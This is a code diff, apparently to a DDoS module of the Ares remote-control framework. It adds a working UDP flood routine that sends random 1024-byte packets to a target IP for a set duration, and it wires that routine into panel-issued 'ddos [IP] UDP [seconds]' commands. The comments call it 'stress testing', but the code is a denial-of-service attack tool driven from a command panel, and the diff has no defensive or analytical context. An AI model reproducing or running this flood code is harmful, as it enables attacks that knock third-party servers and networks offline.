@@ -21,7 +21,7 @@
 
 # ddos http://[host]/ [Attack Type] [requests] - [!] Important to include 'http://' in HTTP type attack
 # ddos [URL] HTTP [requests]
-# ddos [IP] UDP [requests]
+# ddos [IP] UDP [seconds]
 
 # Examples:
 
@@ -29,7 +29,7 @@
 # ddos http://something.com/ HTTP 10000
 
 # UDP Stress Test
-# ddos 11.22.33.44 UDP 10000
+# ddos 11.22.33.44 UDP 120
 
 # Deactive All Tests
 # ddos stop ALL 0
@@ -57,7 +57,8 @@ from atexit import register
 from os import _exit
 from sys import stdout, argv
 
-
+client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #okay so here I create the server, when i say "SOCK_DGRAM" it means it's a UDP type program
+bytes = random._urandom(1024) # 1024 representes one byte to the server
 
 # - Stress functions -
 
@@ -124,6 +125,53 @@ def flood(url, number_of_requests = 1000, number_of_threads = 50):
 
 
 
+# Flood routine [UDP Stress Testing]
+def floodUDP():
+    # Globalize variables
+    global server
+    global secUDP
+
+    # Target Port
+    vport = 80
+
+    # Attack Duration (Seconds)
+    duration  = secUDP
+
+    # Comparison Value for Completion
+    timeout =  time.time() + duration
+
+    # Send count defaulted at 0
+    sent = 0
+     
+    # Start attack loop
+    while 1:
+
+        # Is it active?
+        if isDos == True:
+            # Break out when duration is up
+            if time.time() > timeout:
+                # Announce completion
+                complete()
+                break
+            # Otherwise, proceed with test
+            else:
+                pass
+
+            # Connection >
+            client.sendto(bytes, (server, vport))
+
+            # Increment send count
+            sent = sent + 1
+
+            # Display info
+            print "Attacking %s sent packages %s at the port %s " % (sent, server, vport)
+
+        # if not active then break ..
+        elif isDos == False:
+            break
+
+
+
 # - Command control -
 
 def run(action, dtype, num_req):    
@@ -131,6 +179,8 @@ def run(action, dtype, num_req):
     global requests
     global inc
     global isDos
+    global server
+    global secUDP
 
     # inc initially set to 0
     inc = 0
@@ -154,14 +204,25 @@ def run(action, dtype, num_req):
         # Number of requests
         requests = int(num_req) # Specified number of requests
 
-        # Call function to begin attack
+        # Call function to begin HTTP attack
         flood(server, requests)
 
     # Start [UDP Stress Test]
     elif action != "stop" and dtype == "UDP":
 
         utils.send_output("UDP-DDoS Started.")
-        # Code to be included soon...
+        utils.send_output("Attacking " + action + " for " + str(num_req) + " seconds.")
+        
+        # Boolean value that determines if stresser is active
+        isDos = True
+
+        # Argument passed from Ares panel
+        server = action # Host put in server     
+
+        secUDP = int(num_req) # Specified number of requests
+
+        # Call function to begin UDP Attack
+        floodUDP()   
 
     # Halt Active Sessions
     elif action == "stop" and dtype =="ALL":
@@ -187,11 +248,14 @@ def help():
     Format [HTTP]:
     ddos http://[host]/ [Attack Type] [requests]
 
+    Format [UDP]:
+    ddos [IP] [Attack Type] [seconds]
+
     HTTP Stress Start:
     ddos http://something.com/ HTTP 10000
 
     UDP Stress Start:
-    ddos 11.22.33.44 UDP 10000
+    ddos 11.22.33.44 UDP 120
 
     Stop:
     ddos stop ALL 0
